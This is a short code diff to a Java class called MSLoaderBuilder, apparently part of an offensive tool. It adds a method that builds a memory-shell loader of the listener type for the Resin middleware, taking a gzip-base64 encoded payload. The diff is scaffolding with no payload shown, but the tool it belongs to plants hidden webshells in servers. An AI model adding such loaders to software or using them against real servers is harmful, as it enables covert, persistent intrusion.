@@ -152,6 +152,16 @@ public class MSLoaderBuilder {
 
     }
 
+    /**
+     * Resin
+     */
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Listener)
+    public byte[] resinListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+
+    }
+
 
     /**
      * 直接加载
